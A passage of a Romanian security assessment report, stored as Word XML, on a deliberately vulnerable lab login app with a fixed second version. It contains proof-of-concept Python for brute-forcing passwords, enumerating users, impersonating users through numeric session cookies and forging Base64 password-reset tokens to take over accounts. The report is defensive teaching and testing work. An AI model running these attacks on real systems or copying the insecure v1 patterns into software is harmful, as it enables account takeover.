        <w:t>Dovada – Header Set-Cookie returnat de v1 la login:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE HEADERS la POST /login (v1):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HTTP/1.1 200 OK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Set-Cookie: session_id=1; Path=/; SameSite=lax</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Probleme observabile imediat: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- Valoarea "1" este ID-ul numeric al utilizatorului.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- Lipseste "HttpOnly" → document.cookie functioneaza.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- Lipseste "Secure"   → cookie trimis si pe HTTP (nu doar HTTPS).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- SameSite=lax (nu strict) → vulnerabil partial la CSRF.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.6 Resetare parola nesigura</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Descriere tehnica:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Mecanismul de resetare a parolei din v1 are trei vulnerabilitati critice:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabilitatea A – Token predictibil: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Token-ul de resetare este calculat ca Base64 al adresei de email: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token = base64.urlsafe_b64encode(email.encode()).decode().rstrip('=')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Orice atacator care cunoaste adresa de email a victimei (aflata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prin user enumeration – vuln 4.4) poate calcula tokenul fara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a interactiona cu serverul de resetare.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabilitatea B – Fara expirare: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Token-ul este salvat in tabela reset_tokens fara un timestamp de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expirare valid. Un token generat acum 2 ani este inca acceptat.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabilitatea C – Token reutilizabil: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Dupa utilizarea token-ului pentru resetarea parolei, acesta nu este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sters din baza de date. Poate fi folosit de mai multe ori.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>OWASP Mapping:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- A07:2021 – Identification and Authentication Failures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- CWE-640: Weak Password Recovery Mechanism for Forgotten Password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- CWE-330: Use of Insufficiently Random Values</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Risc: CRITIC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Combinand user enumeration (4.4) cu tokenul predictibil (4.6A),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>un atacator poate prelua orice cont fara a cunoaste parola si fara</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ca victima sa initieze o resetare.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F397D"/>
        </w:rPr>
        <w:t>5. DEMONSTRARE ATAC (PROOF OF CONCEPT)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Scriptul poc.py automatizeaza toate demonstratiile. Se ruleaza astfel:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Impotriva v1 (vulnerabil):  python3 poc.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Impotriva v2 (securizat):   python3 poc.py v2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>5.1 PoC 4.1 – Acceptare parola slaba</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cod relevant din poc.py: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weak_passwords = ["a", "123", "abc123", "password"]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for pwd in weak_passwords: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email = f"weaktest_{pwd}@authx.local"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r = requests.post(f"{base_url}/register",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              json={"email": email, "password": pwd})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if r.status_code == 200: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print(f"[!!!] VULNERABIL: Parola '{pwd}' ACCEPTATA!")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v1 (VULNERABIL):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): Parola 'a' a fost ACCEPTATA!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): Parola '123' a fost ACCEPTATA!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): Parola 'abc123' a fost ACCEPTATA!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): Parola 'password' a fost ACCEPTATA!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v2 (SECURIZAT):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT (v2): Parola 'a' a fost RESPINSA (politica parola).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT (v2): Parola '123' a fost RESPINSA (politica parola).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT (v2): Parola 'abc123' a fost RESPINSA (politica parola).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT (v2): Parola 'password' a fost RESPINSA (politica parola).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>5.2 PoC 4.2 – Cracking MD5 direct din DB</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cod relevant din poc.py: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conn = sqlite3.connect("./db/database.db")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cursor = conn.cursor()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cursor.execute("SELECT email, password_hash FROM users LIMIT 5")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for row in cursor.fetchall():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h = row['password_hash']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if len(h) == 32:  # MD5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print(f"[!!!] VULNERABIL: {row['email']} → hash MD5: {h}")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if h == hashlib.md5(b"password").hexdigest():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    print(f"      Cracat instant! Parola: 'password'")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v1 (VULNERABIL):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): admin@authx.local → hash MD5: 5f4dcc3b5aa765d61d8327deb882cf99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Cracat instant! Parola originala: 'password'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): victim@authx.local → hash MD5: 5f4dcc3b5aa765d61d8327deb882cf99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Cracat instant! Parola originala: 'password'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Observatie: hash-urile identice confirma lipsa salt-ului.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v2 (SECURIZAT):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT (v2): admin@authx.local → hash bcrypt: $2b$12$VzBI57uiG48fm.lJ97/SvO...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT (v2): victim@authx.local → hash bcrypt: $2b$12$KtrfaX0d1bV0Qsbixb...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Observatie: hash-uri diferite pentru aceeasi parola (salt unic per user),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>prefix $2b$ confirma algoritmul bcrypt cu work factor 12.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>5.3 PoC 4.3 – Brute Force fara blocare</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cod relevant din poc.py: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for pwd in ["123456","12345678","admin","authx123","parola1","password"]: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r = requests.post(f"{base_url}/login",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              json={"email": email, "password": pwd})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if r.status_code == 200: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print(f"[!!!] VULNERABIL: Parola gasita: '{pwd}'! Nicio blocare.")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return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elif r.status_code == 429 or "blocat" in r.text.lower():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print(f"[+] SECURIZAT: Cont BLOCAT dupa prea multe incercari!")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return</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v1 (VULNERABIL):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[4.3] Test: Brute Force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare '123456': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare '12345678': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare 'admin': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare 'authx123': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare 'parola1': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): Parola gasita: 'password'! Nicio blocare detectata.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v2 (SECURIZAT):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[4.3] Test: Brute Force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare '123456': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare '12345678': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare 'admin': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare 'authx123': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Incercare 'parola1': 401</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT (v2): Cont BLOCAT dupa prea multe incercari!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Raspuns: Cont blocat pana la 12:41:56. Prea multe incercari esuate.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>5.4 PoC 4.4 – User Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cod relevant din poc.py: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for email, label in [("admin@authx.local","EXISTENT"),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              ("inexistent@authx.local","INEXISTENT")]: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r = requests.post(f"{base_url}/login",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              json={"email": email, "password": "parolaGresita!99"})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detail = r.json().get("detail", "")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if "inexistent" in detail.lower() or "parol" in detail.lower():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print(f"[!!!] VULNERABIL: user {label} → mesaj diferit: '{detail}'")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elif "credentiale invalide" in detail.lower():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print(f"[+] SECURIZAT: user {label} → mesaj generic: '{detail}'")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v1 (VULNERABIL):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL: user EXISTENT (admin@authx.local) → mesaj: 'Parola gresita'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL: user INEXISTENT (inexistent@authx.local) → mesaj: 'User inexistent'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v2 (SECURIZAT):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT: user EXISTENT → mesaj generic: 'Credentiale invalide'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT: user INEXISTENT → mesaj generic: 'Credentiale invalide'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>5.5 PoC 4.5 – Impersonare prin cookie predictibil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cod relevant din poc.py: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s = requests.Session()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r = s.post(f"{base_url}/login", json={"email": email, "password": pwd})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cookie = s.cookies.get("session_id")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try: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user_id = int(cookie)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print(f"[!!!] VULNERABIL: Cookie = ID numeric ({user_id})!")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print(f"      Oricine poate impersona alt user cu cookie '2','3', etc.")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except ValueError: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print(f"[+] SECURIZAT: Cookie este un token random opac.")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v1 (VULNERABIL):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cookie session_id: 1...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): Cookie = ID numeric al utilizatorului (1)!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Oricine poate impersona alt user schimband cookie-ul la '2', '3', etc.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Set-Cookie: session_id=1; Path=/; SameSite=lax</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): Cookie fara HttpOnly → accesibil din JS (risc XSS)!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v2 (SECURIZAT):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cookie session_id: Fe7JL9a4XjdH7YD9-Ozqm5hQjKztjRXdeaSNB_Q4jKo...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT: Cookie este un token random opac (nu ID numeric).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Set-Cookie: session_id=...; HttpOnly; Max-Age=28800; Path=/; SameSite=strict</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT: Cookie are atribut HttpOnly.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT: Cookie are atribut SameSite.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>5.6 PoC 4.6 – Token de resetare predictibil si reutilizabil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>(A) Token predictibil:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Cod relevant din poc.py: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requests.post(f"{base_url}/request-reset", json={"email": email})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fake_token = base64.urlsafe_b64encode(email.encode()).decode().rstrip('=')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r = requests.post(f"{base_url}/reset-password",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          json={"token": fake_token, "new_password": "HackedPassword123!"})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if r.status_code == 200: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print("[!!!] VULNERABIL: Serverul a ACCEPTAT tokenul Base64! Cont preluat!")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v1 (VULNERABIL):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Token ghicit (Base64 email): dmljdGltQGF1dGh4LmxvY2Fs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): Serverul a ACCEPTAT tokenul Base64! Cont preluat!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v2 (SECURIZAT):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Token ghicit (Base64 email): dmljdGltQGF1dGh4LmxvY2Fs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT (v2): Serverul a RESPINS tokenul fabricat (token random).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>(B) Token reutilizabil:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v1 (VULNERABIL):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Token obtinut: dG9rZW50ZXN0QGF1dGh4LmxvY2Fs...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Prima resetare: REUSITA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[!!!] VULNERABIL (v1): Token REUTILIZABIL! A doua resetare a reusit!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Output v2 (SECURIZAT):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Token obtinut: sHRwYyER2x3URIbolXWNhip__dasM5...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Prima resetare: REUSITA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[+] SECURIZAT (v2): Token one-time! A doua utilizare a fost RESPINSA.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F397D"/>
        </w:rPr>
        <w:t>6. ANALIZA IMPACT</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>6.1 Impact per vulnerabilitate</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabilitate 4.1 – Politica parola slaba:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ce poate obtine atacatorul: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- Acces la conturi protejate de parole simple prin dictionary attack.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- Compromitere masiva in cazul unui atac de tip credential stuffing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(reutilizare parole din alte breach-uri).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Scenariu real: atacatorul construieste o lista cu parole comuni si</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ruleaza un script automat. La 10 req/s (modest), incearca 864.000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>de parole pe zi, fara nicio limitare in v1.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabilitate 4.2 – MD5 fara salt:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ce poate obtine atacatorul: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- La obtinerea fisierului database.db, poate recupera TOATE parolele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in interval de minute-ore cu un GPU obisnuit.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- Crackstation.net (hash rainbow table public) spargeinstant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hash-ul MD5 al „password": 5f4dcc3b5aa765d61d8327deb882cf99.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- Hash-urile identice (lipsa salt) dezvaluie toti utilizatorii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cu aceeasi parola dintr-o singura privire.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- Impact: compromitere totala a bazei de date de utilizatori,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inclusiv potential password reuse pe alte platforme.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabilitate 4.3 – Brute Force:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ce poate obtine atacatorul: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- Acces la orice cont pentru care stie email-ul si are timp suficient.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- Cu Hydra sau Burp Intruder: sute de incercari pe secunda.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- Conturile administrative sunt tinte prioritare (admin@authx.local).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Vulnerabilitate 4.4 – User Enumeration:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ce poate obtine atacatorul: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- Lista completa de utilizatori activi in sistem.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- Date de contact (emailuri) pentru campanii de phishing tintit.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- Tinte valide pentru atacurile 4.1 si 4.3.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
